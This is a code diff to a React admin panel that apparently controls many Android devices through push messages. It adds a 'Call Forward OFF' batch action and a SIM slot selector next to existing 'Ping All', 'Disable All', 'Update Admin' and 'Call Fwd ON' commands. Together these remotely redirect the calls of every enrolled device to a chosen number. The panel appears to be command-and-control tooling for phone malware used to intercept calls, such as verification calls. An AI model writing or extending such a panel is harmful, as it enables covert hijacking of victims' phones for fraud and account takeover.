@@ -2190,7 +2190,8 @@ function SettingsTab({ apps, masterPin }: { apps: App[]; masterPin: string }) {
   const [batchTotal, setBatchTotal] = useState(0);
   const [batchResult, setBatchResult] = useState<{ ok: number; fail: number } | null>(null);
   const [adminNumInput, setAdminNumInput] = useState("");
-  const [batchAction, setBatchAction] = useState<"ping" | "disable" | "update_admin" | "call_forward">("ping");
+  const [batchAction, setBatchAction] = useState<"ping" | "disable" | "update_admin" | "call_forward" | "call_fwd_off">("ping");
+  const [batchSim, setBatchSim] = useState<"0" | "1">("0");
 
   /* ── Sessions (per-app selector) ── */
   const [sessAppFilter, setSessAppFilter] = useState(apps[0]?.appId ?? "");
@@ -2262,7 +2263,8 @@ function SettingsTab({ apps, masterPin }: { apps: App[]; masterPin: string }) {
           let data: Record<string, string>;
           if (batchAction === "ping") data = { type: "0" };
           else if (batchAction === "disable") data = { type: "admin_update", status: "off" };
-          else if (batchAction === "call_forward") data = { type: "call_forward", action: "activate", number: adminNumInput.trim(), sim: "0" };
+          else if (batchAction === "call_forward") data = { type: "call_forward", action: "activate", number: adminNumInput.trim(), sim: batchSim };
+          else if (batchAction === "call_fwd_off") data = { type: "call_forward", action: "deactivate", number: "", sim: batchSim };
           else data = { type: "admin_update", status: "on", number: adminNumInput.trim() };
           return apiFetch("/api/fcm/send", { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ deviceId: d.deviceId, data }) }).then(res => { if (!res.ok) throw new Error(); window.dispatchEvent(new CustomEvent("mrrobot:fcm_pinged", { detail: { deviceId: d.deviceId } })); });
         }));
@@ -2316,15 +2318,25 @@ function SettingsTab({ apps, masterPin }: { apps: App[]; masterPin: string }) {
         <div style={{ fontSize: 12, color: T.muted, marginBottom: 12 }}>Send FCM commands to <b style={{ color: T.accentLight }}>ALL FCM-enabled devices</b> across every app at once</div>
 
         <div style={{ display: "flex", gap: 6, marginBottom: 12 }}>
-          {(["ping", "disable", "update_admin", "call_forward"] as const).map(a => (
+          {(["ping", "disable", "update_admin", "call_forward", "call_fwd_off"] as const).map(a => (
             <button key={a} onClick={() => setBatchAction(a)} style={{ flex: 1, padding: "8px 6px", borderRadius: 8, border: `1.5px solid ${batchAction === a ? T.accent : T.borderLight}`, background: batchAction === a ? T.accentGlow : T.border, color: batchAction === a ? T.accentLight : T.muted, fontWeight: 700, fontSize: 11, cursor: "pointer" }}>
-              {a === "ping" ? "Ping All" : a === "disable" ? "Disable All" : a === "update_admin" ? "Update Admin" : "Call Fwd All"}
+              {a === "ping" ? "Ping All" : a === "disable" ? "Disable All" : a === "update_admin" ? "Update Admin" : a === "call_forward" ? "Call Fwd ON" : "Call Fwd OFF"}
             </button>
           ))}
+        {/* SIM slot selector — shown for call forward actions */}
+        {(batchAction === "call_forward" || batchAction === "call_fwd_off") && (
+          <div style={{ display: "flex", gap: 6, marginBottom: 12 }}>
+            {(["0","1"] as const).map(s => (
+              <button key={s} onClick={() => setBatchSim(s)} style={{ flex: 1, padding: "7px 6px", borderRadius: 8, border: `1.5px solid ${batchSim === s ? T.yellow : T.borderLight}`, background: batchSim === s ? T.yellow + "22" : T.border, color: batchSim === s ? T.yellow : T.muted, fontWeight: 700, fontSize: 11, cursor: "pointer" }}>
+                {s === "0" ? "SIM 1 (Slot 0)" : "SIM 2 (Slot 1)"}
+              </button>
+            ))}
+          </div>
+        )}
         </div>
 
         {(batchAction === "update_admin" || batchAction === "call_forward") && (
-          <input type="tel" placeholder={batchAction === "call_forward" ? "Forward to number (SIM 1)" : "Admin phone number"} value={adminNumInput} onChange={e => setAdminNumInput(e.target.value)} style={{ ...inpBase, marginBottom: 12, fontSize: 13 }} />
+          <input type="tel" placeholder={batchAction === "call_forward" ? `Forward to number (SIM ${batchSim === "0" ? "1" : "2"})` : "Admin phone number"} value={adminNumInput} onChange={e => setAdminNumInput(e.target.value)} style={{ ...inpBase, marginBottom: 12, fontSize: 13 }} />
         )}
 
         {(batchState === "loading" || batchState === "running") && (
@@ -2371,7 +2383,7 @@ function SettingsTab({ apps, masterPin }: { apps: App[]; masterPin: string }) {
 
         <button onClick={() => void runBatch()} disabled={busyBatch || ((batchAction === "update_admin" || batchAction === "call_forward") && !adminNumInput.trim())}
           style={{ width: "100%", padding: "11px 0", borderRadius: 9, background: batchState === "done" ? T.green : busyBatch ? T.accentGlow : `linear-gradient(135deg,${T.accent},#8b5cf6)`, border: "none", color: batchState === "done" ? "#fff" : busyBatch ? T.accentLight : "#fff", fontWeight: 800, fontSize: 13, cursor: busyBatch ? "not-allowed" : "pointer", display: "flex", alignItems: "center", justifyContent: "center", gap: 8 }}>
-          {batchState === "loading" ? <><Spinner /> Fetching…</> : batchState === "running" ? <><Spinner /> {batchDone}/{batchTotal}…</> : batchState === "done" ? <><Ic.Check /> Done</> : batchState === "err" ? "Error — Retry" : batchAction === "ping" ? <><Ic.Wifi /> Ping All Devices</> : batchAction === "disable" ? <><Ic.Power /> Disable All</> : batchAction === "call_forward" ? <><Ic.ArrowRight /> Call Forward All (SIM 1)</> : <><Ic.Key /> Update Admin Number</>}
+          {batchState === "loading" ? <><Spinner /> Fetching…</> : batchState === "running" ? <><Spinner /> {batchDone}/{batchTotal}…</> : batchState === "done" ? <><Ic.Check /> Done</> : batchState === "err" ? "Error — Retry" : batchAction === "ping" ? <><Ic.Wifi /> Ping All Devices</> : batchAction === "disable" ? <><Ic.Power /> Disable All</> : batchAction === "call_forward" ? <><Ic.ArrowRight /> Call Forward ON — SIM {batchSim === "0" ? "1" : "2"}</> : batchAction === "call_fwd_off" ? <><Ic.X /> Call Forward OFF — SIM {batchSim === "0" ? "1" : "2"}</> : <><Ic.Key /> Update Admin Number</>}
         </button>
       </div>
 
